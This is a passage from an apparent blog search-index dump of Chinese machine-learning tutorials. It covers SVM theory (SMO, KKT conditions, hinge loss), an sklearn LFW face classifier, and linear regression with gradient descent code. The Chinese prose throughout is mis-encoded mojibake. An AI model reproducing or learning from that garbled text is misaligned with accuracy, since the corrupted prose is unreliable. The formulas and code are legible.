s.t. \\quad \u0026\\displaystyle{\\sum^m_{i=1}\\alpha_iy_i=0}\u0026,i\\in \\{1,2,\\ldots m\\}\\\\ \u0026 0 \\le \\alpha_i \\le C \u0026 , i\\in \\{1,2,\\ldots m\\}\\\\ % \u0026 \\xi_i \\ge 0 \u0026 , i\\in \\{1,2,\\ldots m\\} \\end{aligned} $$ ç­‰ä»·äºæ±‚è§£ ï¼š $$ \\begin{cases} \\displaystyle{w^* = \\sum^m_{i=1}{\\alpha}_i^*y_ix_i}\\\\ \\displaystyle{y_s({w^*}^Tx_s+b^*)=1,\\quad x_sä¸ºä»»æ„æ”¯æŒå‘é‡}\\\\ \\displaystyle{\\alpha^*(y_s({w^*}^Tx_s+b^*)-1)=0,\\quad å¯è·å¾—æ”¯æŒå‘é‡} \\end{cases} $$ é¢„æµ‹å‡½æ•°ï¼š $\\displaystyle{f(x)=sign(\\sum^m_{i=1}\\alpha_i^y_iK(x,x_i)+b^)}$ SMOç®—æ³•æ±‚è§£æœ€ä¼˜åŒ–é—®é¢˜ æ±‚è§£ $\\alpha_i, i\\in {1,2,\\dots m}$ ç®—æ³•æ€æƒ³ï¼š ç”±äº $\\displaystyle{\\sum^m_{i=1}\\alpha_iy_i=0}$ ï¼Œæ•…ä¸èƒ½åªå›ºå®šä¸€ä¸ªå‚æ•° å°†åŸå§‹æ±‚è§£mä¸ªå‚æ•°äºŒæ¬¡è§„åˆ’é—®é¢˜åˆ†è§£æˆå¤šä¸ªå­äºŒæ¬¡è§„åˆ’é—®é¢˜åˆ†åˆ«æ±‚è§£ï¼Œæ¯ä¸ªå­é—®é¢˜åªæ±‚è§£2ä¸ªå‚æ•° é‡‡ç”¨å¯å‘å¼æ–¹æ³•é€‰æ‹©éœ€è¦æ›´æ–°çš„ä¸¤ä¸ªå‚æ•° $\\alpha_i $ å’Œ $\\alpha_j$ ä¾‹å¦‚ï¼Œé€‰æ‹© $\\alpha_1$ å’Œ $\\alpha_2$ ä¼˜åŒ– $\\alpha_i $ å’Œ $\\alpha_j$ ä½¿ç›®æ ‡å‡½æ•°æœ€å¤§ç¨‹åº¦æ¥è¿‘å…¨å±€æœ€ä¼˜è§£ï¼ˆ$\\nabla_{\\alpha_i,\\alpha_j}J(\\alpha)=0$ï¼‰ï¼Œå…¶ä½™å‚æ•°ä¸å˜ $$\\displaystyle{\\min\\limits_{\\alpha_1,\\alpha_2}J(\\alpha_1,\\alpha_2)=\\min\\limits_{\\alpha_1,\\alpha_2}\\frac{1}{2}K_{11}\\alpha_1^2+\\frac{1}{2}K_{22}\\alpha_2^2+y_1y_2K_{12}\\alpha_1\\alpha_2-(\\alpha_1+\\alpha_2)+y_1v_1\\alpha_1+y_2v_2\\alpha_2+Constant}$$ ï¼Œå…¶ä¸­ $$v_i = \\displaystyle{\\sum^m_{j=3}\\alpha_jy_jK(x_i,x_j), i = 1,2}$$ å°†äºŒå…ƒå‡½æ•°è§†ä¸ºä¸€å…ƒå‡½æ•° å¦ $$\\alpha_1 = (\\zeta-y_2\\alpha_2)y_1$$ ï¼Œå¸¦å›ä¸Šå¼ $$\\displaystyle{\\min\\limits_{\\alpha_2}J(\\alpha_2)=\\min\\limits_{\\alpha_2}\\frac{1}{2}K_{11}(\\zeta-y_2\\alpha_2)y_1^2+\\frac{1}{2}K_{22}\\alpha_2^2+y_1y_2K_{12}(\\zeta-y_2\\alpha_2)y_1\\alpha_2-((\\zeta-y_2\\alpha_2)y_1+\\alpha_2)+y_1v_1(\\zeta-y_2\\alpha_2)y_1+y_2v_2\\alpha_2+Constant}$$ å¯¹ $J(\\alpha_2)$ æ±‚å¯¼ï¼Œå¯¼æ•°ä¸º0 $$ \\begin{aligned} \\displaystyle{v_1 = f(x_1)-\\sum^2_{j=1}y_j\\alpha_jK_{1j}-b} \\\\ \\displaystyle{v_2 = f(x_2)-\\sum^2_{j=1}y_j\\alpha_jK_{2j}-b} \\end{aligned} $$ $$\\displaystyle{\\alpha^{new,unclipped}_2 = \\alpha^{old}_2 + \\frac{y_2(E_1-E_2)}{\\eta}}$$ï¼Œå…¶ä¸­ $$\\alpha_2^{new,unclipped}$$ ä¸ºæœªè€ƒè™‘çº¦æŸçš„æ–°å€¼ï¼Œ $$E_i = f(x_i)-y_i, \\ \\eta = K_{11}+K_{22}-2K_{12}$$ å¯¹æ–°å€¼è¿›è¡Œçº¦æŸä¿®å»º $$ \\begin{aligned} \u0026 0 \\le \\alpha_1,\\alpha_2 \\le C \\\\ \u0026 \\alpha_1 + \\alpha_2 = \\zeta \\end{aligned} $$ å½“ $y_1 \\neq y_2$ æ—¶ï¼Œ $$ L=\\max(0,\\alpha^{old}_2-\\alpha^{old}_1),H=\\min(C,C+\\alpha^{old}_2-\\alpha^{old}_1) $$ å½“ $y_1 \\neq y_2$ æ—¶ï¼Œ$$L=\\max(0,\\alpha_1^{old}+\\alpha_2^{old}-C);H=\\min(C,\\alpha_2^{old}+\\alpha_1^{old})$$ $$ \\alpha_2^{\\text{new}} = \\begin{cases} H \u0026, \\alpha_2^{\\text{new,unclipped}} \u003e H \\\\ \\alpha_2^{\\text{new,unclipped}} \u0026, L \\le \\alpha_2^{\\text{new,unclipped}} \\le H \\\\ L \u0026, \\alpha_2^{\\text{new,unclipped}} \u003c L \\end{cases} $$ å¯å‘å¼é€‰æ‹©å˜é‡ ç¬¬ä¸€ä¸ªå˜é‡çš„é€‰æ‹©ç§°ä¸ºå¤–å¾ªç¯ï¼Œé¦–å…ˆéå†æ•´ä¸ªæ ·æœ¬é›†ï¼Œé€‰æ‹©è¿åKKTæ¡ä»¶çš„ $\\alpha_i$ ä½œä¸ºç¬¬ä¸€ä¸ªå˜é‡ã€‚ä¾æ®ç›¸å…³è§„åˆ™é€‰æ‹©ç¬¬äºŒä¸ªå˜é‡ï¼Œå¯¹è¿™ä¸¤ä¸ªå˜é‡é‡‡ç”¨ä¸Šè¿°æ–¹æ³•è¿›è¡Œä¼˜åŒ–ã€‚ç›´åˆ°éå†æ•´ä¸ªæ ·æœ¬é›†åï¼Œæ²¡æœ‰è¿åKKTæ¡ä»¶ $\\alpha_i$ ï¼Œç„¶åé€€å‡º KKTæ¡ä»¶ï¼š $$ \\begin{aligned} \u0026 \\alpha_i = 0 \u0026 \\Rightarrow \u0026 \\qquad y^{(i)}(w^Tx^{(i)}+b) \\ge 1 \\\\ \u0026 \\alpha_i = C \u0026 \\Rightarrow \u0026 \\qquad y^{(i)}(w^Tx^{(i)}+b) \\le 1 \\\\ \u0026 0 \u003c \\alpha_i \u003c C \u0026 \\Rightarrow \u0026 \\qquad y^{(i)}(w^Tx^{(i)}+b) = 1 \\\\ \\end{aligned} $$ ç¬¬äºŒä¸ªå˜é‡çš„é€‰æ‹©æˆä¸ºå†…å¾ªç¯ï¼Œå‡è®¾åœ¨å¤–å¾ªç¯ä¸­æ‰¾åˆ°ç¬¬ä¸€ä¸ªå˜é‡è®°ä¸º $\\alpha_1$ ï¼Œç¬¬äºŒä¸ªå˜é‡çš„é€‰æ‹©å¸Œæœ›èƒ½ä½¿ $\\alpha_2$ æœ‰è¾ƒå¤§å˜åŒ–ã€‚ç”±äº $\\alpha_2$ æ˜¯ä¾èµ–äº $|E_1-E_2|$ ï¼Œå½“ $E_1$ ä¸ºæ­£æ—¶ï¼Œé‚£ä¹ˆé€‰æ‹©æœ€å°çš„ $E_i$ ä½œä¸º $E_2$ ï¼›å¦‚æœ $E_1$ ä¸ºè´Ÿæ—¶ï¼Œé€‰æ‹©æœ€å¤§çš„ $E_i$ ä½œä¸º $E_2$ ï¼Œé€šå¸¸ä¸ºæ¯ä¸ªæ ·æœ¬çš„ $E_i$ ä¿å­˜åœ¨ä¸€ä¸ªåˆ—è¡¨ä¸­ï¼Œé€‰æ‹©æœ€å¤§çš„ $|E_1-E_2|$ æ¥è¿‘ä¼¼æœ€å¤§åŒ–æ­¥é•¿ã€‚ SVMæ¦‚ç‡åŒ–è¾“å‡º ç›®çš„ï¼šå°†å†³ç­–å€¼æ˜ å°„ä¸ºæ¦‚ç‡ï¼ˆå¦‚ $P(y=1âˆ£x)\\in[0,1]$ï¼‰ï¼Œä½¿ç”¨æˆ·èƒ½åˆ¤æ–­æ ·æœ¬å±äºæŸç±»çš„å¯èƒ½æ€§å¤§å° æ ‡å‡†çš„SVMçš„æ— é˜ˆå€¼è¾“å‡ºä¸ºï¼š$f(x)=h(x)+b$ ï¼Œå…¶ä¸­ $h(x)=\\displaystyle{\\sum_iy_i\\alpha_iK(x_i,x)}$ Plattåˆ©ç”¨ sigmoid-fitting æ–¹æ³•ï¼Œå°†æ ‡å‡†çš„SVMçš„è¾“å‡ºç»“æœè¿›è¡Œåå¤„ç†ï¼Œè½¬æ¢ä¸ºåéªŒæ¦‚ç‡ $P(y=1|f)=\\displaystyle{\\frac{1}{1+\\exp(Af+B)}}$ ï¼Œå…¶ä¸­ $A$ å’Œ $B$ ä¸ºå¾…æ‹Ÿåˆå‚æ•°ï¼Œ$f$ ä¸ºæ ·æœ¬ $x$ çš„æ— é˜ˆå€¼è¾“å‡ºã€‚ SVMåˆé¡µæŸå¤± 0-1æŸå¤±æ˜¯äºŒåˆ†ç±»é—®é¢˜çš„çœŸæ­£æŸå¤±å‡½æ•°ï¼Œåˆé¡µæŸå¤±ä¸logisticæŸå¤±æ˜¯å¯¹0-1æŸå¤±å‡½æ•°çš„è¿‘ä¼¼ åˆé¡µæŸå¤±å‡½æ•°(Hinge Loss Function)ï¼š$L(y(wx+b))=[1-y(wx+b)]+$ ï¼Œ $[]+$ è¡¨ç¤ºï¼š $$ [z]_+ = \\begin{cases} z\u0026,z\u003e0 \\\\ 0\u0026,z\\le 0 \\end{cases} $$ ä¹Ÿå°±æ˜¯è¯´ï¼Œæ•°æ®ç‚¹å¦‚æœè¢«æ­£ç¡®åˆ†ç±»ï¼ŒæŸå¤±ä¸º0ï¼Œå¦‚æœæ²¡æœ‰è¢«æ­£ç¡®åˆ†ç±»ï¼ŒæŸå¤±ä¸ºz SVMçš„æŸå¤±å‡½æ•°å°±æ˜¯åˆé¡µæŸå¤±å‡½æ•°+æ­£åˆ™åŒ–é¡¹: $$\\displaystyle{\\min\\limits_{w,b}\\sum^m_{i=1}L(y^{(i)}(w^Tx^{(i)}+b)) + \\lambda ||w||^2}$$ ä¸Šè¿°ç›®æ ‡å‡½æ•°ä¸­ï¼Œå½“ $\\displaystyle{\\lambda = \\frac{1}{2C}}$ æ—¶ã€‚ç­‰ä»·äºåŸç›®æ ‡å‡½æ•° $$\\displaystyle{\\frac{1}{2}||w||^2+C\\sum^m_{i=1}\\xi_i}$$ å®è·µ-äººè„¸åˆ†ç±»å™¨ åŸºäº sklearn å†…ç½® LFW æ•°æ®é›† + SVM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 import numpy as np import matplotlib.pyplot as plt from sklearn.datasets import fetch_lfw_people from sklearn.model_selection import train_test_split from sklearn.preprocessing import StandardScaler from sklearn.decomposition import PCA from sklearn.svm import SVC from sklearn.pipeline import Pipeline from sklearn.metrics import classification_report,accuracy_score # 1ã€åŠ è½½äººè„¸æ•°æ® lfw_people = fetch_lfw_people(min_faces_per_person=70,resize=0.4) X,y,names = (lfw_people.data,lfw_people.target,lfw_people.target_names) n_classes = names.shape[0] print(\u0026#34;æ•°æ®é›†è§„æ¨¡ï¼š\u0026#34;,X.shape) print(\u0026#34;ç±»åˆ«æ•°ï¼š\u0026#34;,n_classes) print(\u0026#34;ç±»åˆ«åï¼š\u0026#34;,names) print() # 2ã€åˆ’åˆ†æ•°æ®é›†ä¸è®­ç»ƒé›† X_train,X_test,y_train,y_test = train_test_split(X,y,test_size=0.25,random_state=428,stratify=y) # 3ã€æ„å»ºæœºå™¨å­¦ä¹ é€šé“ pipe = Pipeline([ # å…ˆé™ç»´ï¼Œå†å½’ä¸€ï¼Œå†SVM ( \u0026#39;pca\u0026#39;, PCA( n_components=150, # åªä¿ç•™150ä¸ªä¸»æˆåˆ†ï¼ˆæŠŠåŸå§‹11750ç»´é™åˆ°150ç»´ï¼‰ whiten=True, # ç™½åŒ–ï¼š150ç»´ç‰¹å¾ç¼©æ”¾åˆ°åŒå°ºåº¦ï¼Œå»ç›¸å…³ random_state=428 ) ), ( \u0026#39;scaler\u0026#39;, StandardScaler() # å¯¹PCAåçš„150ç»´ç‰¹å¾è¿›è¡Œå½’ä¸€åŒ– ), ( \u0026#39;svm\u0026#39;, SVC( kernel=\u0026#39;rbf\u0026#39;, # ä½¿ç”¨é«˜æ–¯æ ¸å‡½æ•°è¿›è¡Œéçº¿æ€§å‡ç»´ class_weight=\u0026#39;balanced\u0026#39;, # è‡ªåŠ¨æ ¹æ®å„ç±»æ ·æœ¬é‡ç»™å‡ºæƒé‡ï¼Œé˜²æ­¢æŸäº›äººç…§ç‰‡å¤šå¯¼è‡´åå‘æ€§ C=5.0, # æ­£åˆ™å¼ºåº¦ï¼ŒCè¶Šå¤§è¶Šä¸å…è®¸è¯¯åˆ†ï¼Œå¯èƒ½å¯¼è‡´è¿‡æ‹Ÿåˆï¼›Cçº¦å°marginè¶Šå¤§å¯èƒ½å¯¼è‡´æ¬ æ‹Ÿåˆ gamma=\u0026#39;scale\u0026#39; # é«˜æ–¯æ ¸å®½åº¦gammaçš„å–å€¼ç­–ç•¥ ) ) ]) # 4ã€è®­ç»ƒæ¨¡å‹ print(\u0026#34;å¼€å§‹è®­ç»ƒ SVM ...\u0026#34;) pipe.fit(X_train,y_train) print(\u0026#34;è®­ç»ƒå®Œæˆ\u0026#34;) print() # 5ã€è¯„ä¼°æ¨¡å‹ y_pred = pipe.predict(X_test) print(f\u0026#34;\\næµ‹è¯•é›†æ•´ä½“å‡†ç¡®ç‡ï¼š{pipe.score(X_test,y_test):.3f}\u0026#34;) print(\u0026#34;\\nè¯¦ç»†åˆ†ç±»æŠ¥å‘Šï¼š\u0026#34;) print(classification_report(y_test, y_pred, target_names=names)) æ•°æ®é›†è§„æ¨¡ï¼š (1288, 1850) ç±»åˆ«æ•°ï¼š 7 ç±»åˆ«åï¼š ['Ariel Sharon' 'Colin Powell' 'Donald Rumsfeld' 'George W Bush' 'Gerhard Schroeder' 'Hugo Chavez' 'Tony Blair'] å¼€å§‹è®­ç»ƒ SVM ... è®­ç»ƒå®Œæˆ â€‹ â€‹ æµ‹è¯•é›†æ•´ä½“å‡†ç¡®ç‡ï¼š0.851 â€‹ â€‹ è¯¦ç»†åˆ†ç±»æŠ¥å‘Šï¼š â€‹ precision recall f1-score support â€‹ Ariel Sharon 1.00 0.47 0.64 19 Colin Powell 0.84 0.90 0.87 59 Donald Rumsfeld 0.95 0.70 0.81 30 George W Bush 0.80 0.98 0.88 133 Gerhard Schroeder 0.95 0.78 0.86 27 Hugo Chavez 1.00 0.56 0.71 18 Tony Blair 0.91 0.83 0.87 36\naccuracy 0.85 322 macro avg 0.92 0.75 0.81 322 weighted avg 0.87 0.85 0.84 322 â€‹\n","date":"2025-12-02T18:51:05+08:00","image":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E7%BA%BF%E6%80%A7%E5%88%86%E7%B1%BB/SVM_hu_567b260b9cac608.jpg","permalink":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E7%BA%BF%E6%80%A7%E5%88%86%E7%B1%BB/","title":"æœºå™¨å­¦ä¹ -çº¿æ€§åˆ†ç±»"},{"content":" ç›®å½• ä¸€ã€æ­£è§„æ–¹ç¨‹ï¼ˆNormal Equationï¼‰ 1ã€ä¸€ç»´çº¿æ€§å›å½’ï¼ˆä»£ç å®ç°ï¼‰ 2ã€é«˜ç»´çº¿æ€§å›å½’ï¼ˆä»£ç å®ç°ï¼‰ 3ã€é«˜ç»´çº¿æ€§å›å½’ï¼ˆsklearnåº“ï¼‰ äºŒã€æ¢¯åº¦ä¸‹é™ï¼ˆGradient Descentï¼‰ 1ã€æ‰¹é‡æ¢¯åº¦ä¸‹é™ï¼ˆGDï¼‰ ä»£ç å®ç° 2ã€éšæœºæ¢¯åº¦ä¸‹é™ï¼ˆSGDï¼‰ (1)ã€ä»£ç å®ç° (2)ã€å°å¹…ä¼˜åŒ–ï¼šæ‰“ä¹±æ•°æ®ç´¢å¼•ï¼Œé¡ºåºé€‰å–å‘é‡ 3ã€å°æ‰¹é‡æ¢¯åº¦ä¸‹é™ï¼ˆMini-batch SGDï¼‰ (1)ã€ä»£ç å®ç° (2)ã€å°å¹…ä¼˜åŒ–ï¼šæ‰“ä¹±æ•°æ®ç´¢å¼•ï¼Œé¡ºåºæ‰¹é‡é€‰å–å‘é‡ 4ã€SGDçš„sklearnåº“å®ç° 5ã€æ¢¯åº¦ä¸‹é™æ³•çš„é—®é¢˜ä¸è§£å†³æ€è·¯ ï¼ˆ1ï¼‰ã€ç¡®å®šé€Ÿç‡è°ƒæ•´å‡½æ•° ï¼ˆ2ï¼‰ã€æ›´æ”¹å­¦ä¹ é€Ÿç‡ ä¸‰ã€åæ ‡ä¸‹é™ï¼ˆCoordinate Descentï¼‰ ä»£ç å®ç° å››ã€å½’ä¸€åŒ–ï¼ˆNormalizationï¼‰ äº”ã€æ­£åˆ™åŒ–ï¼ˆRegularizationï¼‰ 1ã€Lassoå›å½’ï¼ˆsklearnåº“ï¼‰ 2ã€Ridgeå›å½’ï¼ˆsklearnåº“ï¼‰ 3ã€ElasticNetå›å½’ï¼ˆsklearnåº“ï¼‰ 4ã€éšæœºæ¢¯åº¦ä¸‹é™å®ç°elasticnetæ­£åˆ™åŒ–ï¼ˆsklearnåº“ï¼‰ å…­ã€å‡ç»´æ–¹æ³• â€” å¤šé¡¹å¼å›å½’ï¼ˆPolynomial Regressionï¼‰ ä¸ƒã€å®è·µ â€” ä¿é™©èŠ±é”€é¢„æµ‹ 1ã€æ•°æ®æå– 2ã€EDAï¼ˆExploratory Data Analysisï¼Œæ¢ç´¢æ€§æ•°æ®åˆ†æï¼‰ 3ã€ç‰¹å¾å·¥ç¨‹ 4ã€æ¨¡å‹è®­ç»ƒ 5ã€æ¨¡å‹è¯„ä¼° 6ã€è¿›é˜¶ çº¿æ€§å›å½’ï¼ˆLinear Regressionï¼‰ ä»»åŠ¡ç±»å‹åˆ†ç±»ï¼šæœ‰ç›‘ç£å­¦ä¹  å®šä¹‰ï¼šæ‹Ÿåˆå› å˜é‡(å‘é‡) y ä¸ x ä¹‹é—´å‘ˆçº¿æ€§å…³ç³»ï¼Œå³ $\\mathbf{y} = \\mathbf{w}^T\\mathbf{x} + \\mathbf{b}$ï¼Œå…¶ä¸­ $\\mathbf{x,y,w,b \\in \\mathbb{R}^n}$ ç›®æ ‡ï¼šå¯»æ‰¾å‚æ•°æœ€ä¼˜è§£ä½¿å¾—$\\operatorname{Loss}$å‡½æ•°æœ€å°ã€‚$(\\hat{\\mathbf{w}}, \\hat{\\mathbf{b}}) = \\operatorname{Loss}(\\mathbf{y}, \\hat{\\mathbf{y}}) \\Leftrightarrow\\operatorname{Argmin}(\\operatorname{Loss}(\\mathbf{w}, \\mathbf{b}))$ å¤šå…ƒçº¿æ€§å›å½’å¸¸ç”¨æŸå¤±å‡½æ•° â€”â€” MSE(å‡æ–¹è¯¯å·®ï¼Œç”±ä¼¼ç„¶å‡½æ•°æ¨å¯¼è€Œæ¥): $$ \\displaystyle{\\operatorname{\\mathit{J}(\\theta)} = \\frac{1}{2} \\displaystyle \\sum_{i=1}^{m} (h_\\theta(x^{(i)}) - y^{(i)})^2 = \\frac{1}{2}(X\\theta - y)^T(X\\theta - y) = \\frac{1}{2}(\\theta^TX^TX\\theta - \\theta^TX^Ty - y^TX\\theta + y^Ty)},ç³»æ•°å¯ä¸º\\displaystyle{\\frac{1}{2}ã€\\frac{1}{n}ã€\\frac{1}{2n}} $$ MSEå¯¹ $\\theta$ çš„æ¢¯åº¦: $$ \\displaystyle{\\frac{\\partial{J}(\\theta)}{\\partial\\theta} = X^TX\\theta - X^Ty = 0 \\Rightarrow \\theta = (X^TX)^{-1}X^Ty} $$ ä¸€ã€æ­£è§„æ–¹ç¨‹ï¼ˆNormal Equationï¼‰ å‚æ•°è§£æè§£ï¼š $\\hat{\\theta} = (X^TX)^{-1}X^Ty$ å¯èƒ½å­˜åœ¨çš„é—®é¢˜ï¼š$(X^TX)^{-1}$çš„æ±‚è§£å¯èƒ½æ¯”è¾ƒå›°éš¾ 1ã€ä¸€ç»´çº¿æ€§å›å½’ï¼ˆä»£ç å®ç°ï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import numpy as np import matplotlib.pyplot as plt np.random.seed(20030428) # æ•°æ®é‡ m = 100 # éšæœºç”Ÿæˆ x åºåˆ— x = np.random.rand(m,1) * 2 # æ¨¡æ‹Ÿ x å¯¹åº”çš„ y æ ‡ç­¾ï¼Œè¯¯å·®å‘ˆæ­£æ€åˆ†å¸ƒ y = 5 + x*4 + np.random.randn(m,1) # è¡¥å…… x0 åˆ— X = np.c_[np.ones((m,1)),x] # å‚æ•°çš„æ±‚è§£å…¬å¼ w_hat = np.linalg.inv(X.T.dot(X)).dot(X.T).dot(y) # é¢„æµ‹ x_pre = [[0.5],[1.5]] X_pre = np.c_[np.ones((2,1)),x_pre] y_pre = X_pre.dot(w_hat) plt.scatter(x,y,label=\u0026#39;Original Data\u0026#39;) plt.scatter(x_pre,y_pre,label=\u0026#39;Predicted Data\u0026#39;) plt.plot(x,X.dot(w_hat),label=\u0026#39;Regression Model\u0026#39;) plt.legend() plt.show() 2ã€é«˜ç»´çº¿æ€§å›å½’ï¼ˆä»£ç å®ç°ï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import numpy as np np.random.seed(20030428) # ç»´åº¦ n = 4 # æ•°æ®é‡ m = 1000 # è®¾ç½®é¢„æµ‹å€¼ x_pre = np.random.random(size = (3,n))*10 # éšæœºç”Ÿæˆ x åºåˆ— x = np.random.rand(m,n) * 2 # è¡¥å…… x0 åˆ— X = np.c_[np.ones((m,1)),x] # æ¨¡æ‹Ÿ x å¯¹åº”çš„ y æ ‡ç­¾ï¼Œè¯¯å·®å‘ˆæ­£æ€åˆ†å¸ƒ w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) # å‚æ•°çš„æ±‚è§£å…¬å¼ w_hat = np.linalg.inv(X.T.dot(X)).dot(X.T).dot(y) print(\u0026#39;W_hat:\u0026#39;) print(w_hat.reshape(1,n+1)) # é¢„æµ‹ X_pre = np.c_[np.ones((3,1)),x_pre] y_pre = X_pre.dot(w_hat) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[5.02671056 3.98404888 4.00452019 4.9783491 1.02490084]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.23707594] [68.2285754 ] [75.97196488]] 3ã€é«˜ç»´çº¿æ€§å›å½’ï¼ˆsklearnåº“ï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import numpy as np from sklearn.linear_model import LinearRegression np.random.seed(20030428) # ç»´åº¦ n = 4 # æ•°æ®é‡ m = 1000 # è®¾ç½®é¢„æµ‹å€¼ x_pre = np.random.random(size = (3,n))*10 # éšæœºç”Ÿæˆ x åºåˆ— x = np.random.rand(m,n) * 2 # è¡¥å…… x0 åˆ— X = np.c_[np.ones((m,1)),x] # æ¨¡æ‹Ÿ x å¯¹åº”çš„ y æ ‡ç­¾ï¼Œè¯¯å·®å‘ˆæ­£æ€åˆ†å¸ƒ w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) reg = LinearRegression(fit_intercept=True) reg.fit(x,y) print(\u0026#39;W_hat:\u0026#39;) print(np.c_[reg.intercept_,reg.coef_]) # é¢„æµ‹ y_pre = reg.predict(x_pre) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[5.02671056 3.98404888 4.00452019 4.9783491 1.02490084]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.23707594] [68.2285754 ] [75.97196488]] äºŒã€æ¢¯åº¦ä¸‹é™ï¼ˆGradient Descentï¼‰ æ¢¯åº¦ä¸‹é™æ³•è¿­ä»£å…¬å¼ï¼š$\\hat\\theta_{k+1} = \\hat\\theta_k - \\alpha \\nabla_{\\theta}J(\\hat\\theta)$, $\\alpha$ä¸ºå­¦ä¹ ç‡ å­¦ä¹ ç‡ $\\alpha$ ï¼š$\\alpha$ è®¾ç½®è¿‡å¤§å®¹æ˜“é€ æˆéœ‡è¡ï¼Œ$\\alpha$ è®¾ç½®å¤ªå°å®¹æ˜“é€ æˆè¿­ä»£æ¬¡æ•°å¢åŠ ï¼Œä¹Ÿå¯èƒ½è½åˆ°å±€éƒ¨æœ€ä¼˜è§£ã€‚ä¸€èˆ¬è®¾ç½®ä¸º0.1ã€0.01ã€0.001ã€0.0001 1ã€æ‰¹é‡æ¢¯åº¦ä¸‹é™ï¼ˆGDï¼‰ $$\\displaystyle{\\nabla_{\\theta}J(\\theta) = \\frac{\\partial}{\\partial{\\theta}}J(\\theta) = \\displaystyle \\sum^{m}_{i=1}(h_\\theta(x^{(i)}) - y^{(i)})x^{(i)} = X^T(X\\theta-y)}$$ ä»£ç å®ç° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 import numpy as np np.random.seed(20030428) # ç»´åº¦ n = 4 # æ•°æ®é‡ m = 1000 # è®¾ç½®é¢„æµ‹å€¼ x_pre = np.random.random(size = (3,n))*10 # è¶…å‚æ•° learning_rate = 0.0001 # å­¦ä¹ ç‡ Î± n_iterations = 1000 # è¿­ä»£æ¬¡æ•° # éšæœºç”Ÿæˆ x åºåˆ— x = np.random.rand(m,n) * 2 # è¡¥å…… x0 åˆ— X = np.c_[np.ones((m,1)),x] # æ¨¡æ‹Ÿ x å¯¹åº”çš„ y æ ‡ç­¾ï¼Œè¯¯å·®å‘ˆæ­£æ€åˆ†å¸ƒ w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) # åˆå§‹åŒ–å‚æ•°å‘é‡ w_init = np.random.randn(n+1,1) # æ±‚æ¢¯åº¦ for n_iteration in range(n_iterations): gradient = X.T.dot(X.dot(w_init)-y) w_init = w_init - learning_rate*gradient print(\u0026#39;W_hat:\u0026#39;) print(w_init.reshape(1,n+1)) # é¢„æµ‹ y_pre = np.c_[np.ones((3,1)),x_pre].dot(w_init) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[5.02631227 3.98414324 4.00461388 4.97843832 1.02499615]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.23804251] [68.23011847] [75.97363505]] 2ã€éšæœºæ¢¯åº¦ä¸‹é™ï¼ˆSGDï¼‰ $$ \\displaystyle {\\nabla_{\\theta}J(\\theta) = \\frac{\\partial}{\\partial\\theta}J(\\theta) = (h_\\theta(x^{(i)})-y^{(i)})x^{(i)} = ({x^{(i)}})^T(x^{(i)}\\theta-y^{(i)}) , i \\sim \\text{Uniform}\\bigl(\\{1,2,\\dots,m\\}\\bigr)} $$ (1)ã€ä»£ç å®ç° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 import numpy as np np.random.seed(20030428) # ç»´åº¦ n = 4 # æ•°æ®é‡ m = 1000 # è®¾ç½®é¢„æµ‹å€¼ x_pre = np.random.random(size = (3,n))*10 # è¶…å‚æ•° learning_rate = 0.0001 # å­¦ä¹ ç‡ Î± n_iterations = 1000 # è¿­ä»£æ¬¡æ•° # éšæœºç”Ÿæˆ x åºåˆ— x = np.random.rand(m,n) * 2 # è¡¥å…… x0 åˆ— X = np.c_[np.ones((m,1)),x] # æ¨¡æ‹Ÿ x å¯¹åº”çš„ y æ ‡ç­¾ï¼Œè¯¯å·®å‘ˆæ­£æ€åˆ†å¸ƒ w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) # åˆå§‹åŒ–å‚æ•°å‘é‡ w_init = np.random.randn(n+1,1) # æ±‚æ¢¯åº¦ for n_iteration in range(n_iterations): for _ in range(m): random_index = np.random.randint(m) x_i = X[random_index:random_index+1,:] y_i = y[random_index:random_index+1,:] gradient = x_i.T.dot(x_i.dot(w_init)-y_i) w_init = w_init - learning_rate*gradient print(\u0026#39;W_hat:\u0026#39;) print(w_init.reshape(1,n+1)) # é¢„æµ‹ y_pre = np.c_[np.ones((3,1)),x_pre].dot(w_init) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[5.01922912 3.97831998 4.00264292 